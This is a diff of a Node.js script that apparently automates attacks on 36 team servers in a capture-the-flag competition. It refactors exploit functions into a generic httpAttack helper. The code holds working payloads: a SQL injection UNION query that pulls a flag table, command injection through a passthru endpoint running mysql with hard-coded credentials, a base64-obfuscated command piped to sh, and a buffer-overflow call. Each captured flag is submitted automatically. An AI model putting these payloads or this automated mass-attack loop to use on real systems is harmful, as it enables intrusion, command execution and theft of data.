@@ -24,98 +24,33 @@ var parseFlag = function (regex, data) {
     }
 }
 
+var httpAttack = function (regex, genURL) {
+    var req = http.request(genURL(), function (res) {
+        res.setEncoding('utf8');
+        res.on('data', function (data) {
+            flag = parseFlag(regex, data)
+            if (flag) {
+                console.log('FLAG: '.yellow, team.toString().green, flag);
+                submit(flag);
+                req.destroy();
+            }
+        });
+    });
+    req.on('error', function(e) {
+        console.log('ERROR: '.red, team, e.message);
+        req.destroy();
+    });
+    req.setTimeout(10000, function () {
+        console.log('TIMEOUT: '.red, team);
+        req.destroy();
+    });
+    req.end();
 
-//
-//  PMC name search injection
-//
+};
 
-// regex for flag scrawling
 var pmcNameSearchInjectionRegex = /\>\d* (\w*)\<\/div\>/;
-var pmcNameSearchInjection = function (team) {
-    var url = "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
-    var req = http.request(url, function (res) {
-        res.setEncoding('utf8');
-        res.on('data', function (data) {
-            flag = parseFlag(pmcNameSearchInjectionRegex, data)
-            if (flag) {
-                console.log('FLAG: '.yellow, team, flag);
-                submit(flag);
-                req.destroy();
-            }
-        });
-
-    });
-    req.on('error', function(e) {
-        console.log('ERROR: '.red + e.message);
-        req.destroy();
-    });
-    req.setTimeout(10000, function () {
-        console.log('TIMEOUT: '.red);
-        req.destroy();
-    });
-    req.end();
-}
-
-
-//
-//  PMC db passthru shit
-//
-
 var pmcDBPassthruRegex = /id\s+flag\s*\d+\s*(\w+)/
-var pmcDBPassthru = function (team) {
-    var url = "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
-    var req = http.request(url, function (res) {
-        res.setEncoding('utf8');
-        res.on('data', function (data) {
-            flag = parseFlag(pmcDBPassthruRegex, data)
-            if (flag) {
-                console.log('FLAG: '.yellow, team, flag);
-                submit(flag);
-                req.destroy();
-            }
-        });
-
-    });
-    req.on('error', function(e) {
-        console.log('ERROR: '.red + e.message);
-        req.destroy();
-    });
-    req.setTimeout(10000, function () {
-        console.log('TIMEOUT: '.red);
-        req.destroy();
-    });
-    req.end();
-}
-
-//
-//  PMC db passthru echo
-//
-
 var pmcDBPassthruEchoRegex = /flag\s*(\w+)/
-var pmcDBPassthruEcho = function (team) {
-    var url = "http://10.8." + team.toString() + '.100:7788/menu.php/db/passthru/echo+-n+"bXlzcWwgLUQgcG1jIC11IGpveSAtcGNoYW5zZXkgLWUgInNlbGVjdCBmbGFnIGZyb20gZmxhZyI%3D"+%7C+base64+-d+%7C+sh+2>%261';
-    var req = http.request(url, function (res) {
-        res.setEncoding('utf8');
-        res.on('data', function (data) {
-            flag = parseFlag(pmcDBPassthruEchoRegex, data)
-            if (flag) {
-                console.log('FLAG: '.yellow, team, flag);
-                submit(flag);
-                req.destroy();
-            }
-        });
-
-    });
-    req.on('error', function(e) {
-        console.log('ERROR: '.red + e.message);
-        req.destroy();
-    });
-    req.setTimeout(10000, function () {
-        console.log('TIMEOUT: '.red);
-        req.destroy();
-    });
-    req.end();
-}
 
 //
 //
@@ -142,11 +77,11 @@ var sspLoginBufferOverflow = function (team) {
         }
     });
     req.on('error', function(e) {
-        console.log('ERROR: '.red + e.message);
+        console.log('ERROR: '.red, team, e.message);
         req.destroy();
     });
     req.setTimeout(10000, function () {
-        console.log('TIMEOUT: '.red);
+        console.log('TIMEOUT: '.red, team);
         req.destroy();
     });
 
@@ -154,11 +89,22 @@ var sspLoginBufferOverflow = function (team) {
 
 var attackAll = function () {
     console.log('====== START ATTACKING ====='.red);
-    for (i = 0; i < 36; i++) {
-        pmcNameSearchInjection(i);
-        pmcDBPassthru(i);
-        pmcDBPassthruEcho(i);
-        sspLoginBufferOverflow(i);
+    for (team = 0; team < 36; team++) {
+
+        // PMC name search injection
+        httpAttack(pmcNameSearchInjectionRegex, function () {
+            return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
+        });
+        // PMC Passthru
+        httpAttack(pmcDBPassthruRegex, function () {
+            return "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
+        });
+        // PMC Passthru Echo
+        httpAttack(pmcDBPassthruEchoRegex, function () {
+            return "http://10.8." + team.toString() + '.100:7788/menu.php/db/passthru/echo+-n+"bXlzcWwgLUQgcG1jIC11IGpveSAtcGNoYW5zZXkgLWUgInNlbGVjdCBmbGFnIGZyb20gZmxhZyI%3D"+%7C+base64+-d+%7C+sh+2>%261';
+        });
+
+        sspLoginBufferOverflow(team);
     }
 };
 // main
